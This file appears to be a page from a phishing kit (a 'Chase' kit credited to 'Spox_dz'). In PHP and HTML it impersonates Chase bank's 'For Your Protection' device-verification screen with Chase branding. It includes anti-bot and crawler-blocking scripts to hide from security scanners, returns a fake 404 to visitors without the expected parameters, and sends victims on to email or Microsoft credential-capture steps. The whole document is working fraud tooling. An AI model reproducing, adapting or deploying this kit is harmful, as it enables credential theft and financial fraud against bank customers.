<?php
session_start();
error_reporting(0);

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Chase -
 * version 3.0
 * icq & telegram = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Chase             $#
###############################################

**/

include'Spox/Anti/IP-BlackList.php';  
include'Spox/Anti/Bot-Crawler.php';
include'Spox/Anti/Bot-Spox.php';
include'Spox/Anti/blacklist.php';
include'Spox/Anti/new.php';
include'Spox/Functions/Fuck-you.php'; 
include'Spox/Anti/Dila_DZ.php';
include'admin/YOUR-CONFIG.php';


$key = substr(sha1(mt_rand()),1,25);

if ($spam_hotmail=="yes") {
        $start ="microsoft?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."";
    }else{
        $start ="email_identification?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."";
    }


if (!isset($_GET['chase_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }
    
if (!isset($_SESSION['CHASE_SPOX'])) {
  header("Location: index");
  exit();
}
if (!isset($_SESSION['login_SESSION'])) {
  header("Location: login");
  exit();
}

?>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" dir="ltr">
<head>
        <meta charset="utf-8">
        <meta name="robots" content="noindex,nofollow">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>For Your Protection</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="shortcut icon" href="Spox/Files/img/chasefavicon.ico">
        <link rel="apple-touch-icon" sizes="152x152" href="Spox/Files/img/chase-touch-icon-152x152.png">
        <link rel="apple-touch-icon" sizes="120x120" href="Spox/Files/img/chase-touch-icon-120x120.png">
        <link rel="apple-touch-icon" sizes="76x76" href="Spox/Files/img/chase-touch-icon-76x76.png">
        <link rel="apple-touch-icon" href="Spox/Files/img/chase-touch-icon.png">
        <link rel="stylesheet" href="Spox/Files/css/logon.css">
        <link rel="stylesheet" href="Spox/Files/css/blue-ui2.css">
        <link rel="stylesheet" href="Spox/Files/css/overview.css">

</head>
<body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
<div data-is-view="true">
<div class="homepage">

<div class="logon-container">
<header class="toggle-aria-hidden">
<div class="logon header jpui transparent navigation bar">
<a href="#">
<div class="chase logo"></div>
<span class="util accessible-text">SPOX LOVE YOU !</span>
</a> 
</div>
</header>

<form action="<?php echo $start;?>" method="POST">
<main >
<div class="msd">

<div class="jpui background image fixed blurred"></div>
<div class="container">
<div class="row jpui primary panel">
<div class="col-xs-12 col-md-10 col-md-offset-1 content-container">
<div class="toggle-aria-hidden">
<h1 class="header">For Your Protection</h1>
<div class="row jpui panel body">
    <div class="col-xs-12 col-sm-10 col-sm-offset-1">
    <div class="progress u-no-outline">
    <div class="row">
    <div class="col-xs-12 col-sm-6 clear-padding"><h2>Instructions</h2></div>
    <div class="col-xs-12 col-sm-6 progress-padding">
    <div class="jpui progress rectangles">
    <ol class="steps-3">
        <li class="active current-step"></li>
        <li id="progress-progressBar-step-2"></li>
        <li id="progress-progressBar-step-3"></li>
    </ol>
</div>
</div>
</div>
</div>
<h3>We don't recognize the computer you're using.</h3>
<div class="inside-container">
<p>This may have happened because you're using a device you don't usually use or you cleared the cookies on your phone. (Cookies are how we remember you.)<br>
<br>For your security, we need to verify your identity before you can sign in to your accounts.<br>
<br>Choose "Next" to let us know how you want to receive your temporary identification code.</p> <p>
    <span class="jpui link">
    <a class="link-anchor underline" href="javascript:void(0);" >Questions?</a>
</span>
</p>
</div>

<div class="button-container row show-sm">
<div class="col-xs-12 col-sm-3 col-sm-offset-6">
<button type="button" class="jpui button focus fluid cancel">
<span class="label">Cancel</span>
</button>
</div>
<div class="col-xs-12 col-sm-3">
<button type="submit" class="jpui button focus fluid primary">
<span class="label">Next</span>
</button>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</main>
</form>
</div>
</div> 
</div>


</body>
</html>